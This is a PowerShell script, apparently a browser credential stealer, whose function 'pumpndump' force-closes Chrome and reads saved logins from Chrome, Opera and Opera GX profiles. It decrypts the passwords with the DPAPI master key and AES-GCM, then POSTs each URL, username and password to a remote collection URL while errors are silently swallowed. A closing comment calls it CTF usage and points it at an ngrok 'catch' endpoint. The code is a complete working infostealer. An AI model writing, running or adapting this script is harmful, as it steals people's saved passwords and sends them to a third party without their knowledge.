function pumpndump
{
    param(
        [Parameter(Mandatory = $true)] [String]$hq
    )
    $ErrorActionPreference = 'SilentlyContinue'

    function B64 {
        param([String]$Text)
        return [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Text))
    }

    try {
        Stop-Process -Name "chrome" -Force
        $chrome_path = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        $profiles = Get-ChildItem "$chrome_path" | Where-Object { $_.Name -match 'Default|Profile \d+' }

        foreach ($profile in $profiles) {
            $loginData = Join-Path $profile.FullName "Login Data"
            if (-not (Test-Path $loginData)) { continue }

            # Get master key (still needed to decrypt Chrome passwords)
            $localState = Get-Content "$chrome_path\Local State" -Raw | ConvertFrom-Json
            $encrypted_key = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
            $master_key = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $encrypted_key[5..$encrypted_key.Length], $null, 
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            )

            # Simple SQLite reading (re-using your existing P/Invoke code for brevity)
            Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                public class WinSQLite3 {
                    const string dll = "winsqlite3";
                    [DllImport(dll, EntryPoint="sqlite3_open")] public static extern int Open(string filename, out IntPtr db);
                    [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")] public static extern int Prepare2(IntPtr db, string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
                    [DllImport(dll, EntryPoint="sqlite3_step")] public static extern int Step(IntPtr stmt);
                    [DllImport(dll, EntryPoint="sqlite3_column_text16")] static extern IntPtr ColumnText16(IntPtr stmt, int index);
                    [DllImport(dll, EntryPoint="sqlite3_column_blob")] static extern IntPtr ColumnBlob(IntPtr stmt, int index);
                    [DllImport(dll, EntryPoint="sqlite3_column_bytes")] static extern int ColumnBytes(IntPtr stmt, int index);
                    public static string GetString(IntPtr stmt, int i) { return Marshal.PtrToStringUni(ColumnText16(stmt, i)); }
                    public static byte[] GetBlob(IntPtr stmt, int i) {
                        int len = ColumnBytes(stmt, i);
                        if (len == 0) return new byte[0];
                        byte[] buf = new byte[len];
                        Marshal.Copy(ColumnBlob(stmt, i), buf, 0, len);
                        return buf;
                    }
                }
"@

            $db = 0; $stmt = 0
            [WinSQLite3]::Open($loginData, [ref]$db)
            [WinSQLite3]::Prepare2($db, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$stmt, [IntPtr]::Zero)

            while ([WinSQLite3]::Step($stmt) -eq 100) {
                $url      = [WinSQLite3]::GetString($stmt, 0)
                $user     = [WinSQLite3]::GetString($stmt, 1)
                $enc_pass = [WinSQLite3]::GetBlob($stmt, 2)

                # Decrypt password using Chrome's DPAPI + AES-GCM
                if ($enc_pass.Length -gt 15 -and [BitConverter]::ToString($enc_pass[0..2]) -eq "76-31-30") {
                    $nonce = $enc_pass[3..14]
                    $ciphertext = $enc_pass[15..($enc_pass.Length-1)]
                    $aes = [System.Security.Cryptography.AesGcm]::new($master_key)
                    $plaintext = New-Object byte[] ($ciphertext.Length)
                    $aes.Decrypt($nonce, $ciphertext, $null, $plaintext)
                    $pass = [System.Text.Encoding]::UTF8.GetString($plaintext)
                } else { $pass = "" }

                # Only Base64 encode — NO encryption anymore
                $payload = @{
                    url      = B64 $url
                    username = B64 $user
                    password = B64 $pass
                }

                try {
                    $resp = Invoke-WebRequest -UseBasicParsing -Method POST -Uri $hq -Body $payload -TimeoutSec 10
                    Write-Host "$url | $user | $pass"
                } catch { }
            }
        }
    } catch { }

    # Opera & Opera GX (same logic, much shorter)
    foreach ($browser in @("Opera Software\Opera Stable", "Opera Software\Opera GX Stable")) {
        try {
            $path = "$env:APPDATA\$browser"
            $loginData = "$path\Login Data"
            if (-not (Test-Path $loginData)) { continue }

            $localState = Get-Content "$path\Local State" -Raw | ConvertFrom-Json
            $encrypted_key = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
            $master_key = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $encrypted_key[5..$encrypted_key.Length], $null, 
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            )

            $db = 0; $stmt = 0
            [WinSQLite3]::Open($loginData, [ref]$db)
            [WinSQLite3]::Prepare2($db, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$stmt, [IntPtr]::Zero)

            while ([WinSQLite3]::Step($stmt) -eq 100) {
                $url      = [WinSQLite3]::GetString($stmt, 0)
                $user     = [WinSQLite3]::GetString($stmt, 1)
                $enc_pass = [WinSQLite3]::GetBlob($stmt, 2)

                if ($enc_pass.Length -gt 15 -and $enc_pass[0..2] -contains 118,49,48) {  # v10/v11 tag
                    $nonce = $enc_pass[3..14]
                    $ciphertext = $enc_pass[15..($enc_pass.Length-1)]
                    $aes = [System.Security.Cryptography.AesGcm]::new($master_key)
                    $plaintext = New-Object byte[] ($ciphertext.Length)
                    $aes.Decrypt($nonce, $ciphertext, $null, $plaintext)
                    $pass = [System.Text.Encoding]::UTF8.GetString($plaintext)
                } else { $pass = "" }

                $payload = @{
                    url      = B64 $url
                    username = B64 $user
                    password = B64 $pass
                }

                try {
                    Invoke-WebRequest -UseBasicParsing -Method POST -Uri $hq -Body $payload -TimeoutSec 10 | Out-Null
                    Write-Host "$url | $user | $pass"
                } catch { }
            }
        } catch { }
    }
}

# Example usage in CTF:
# pumpndump -hq "http://your-ctf-server.ngrok.io/catch"
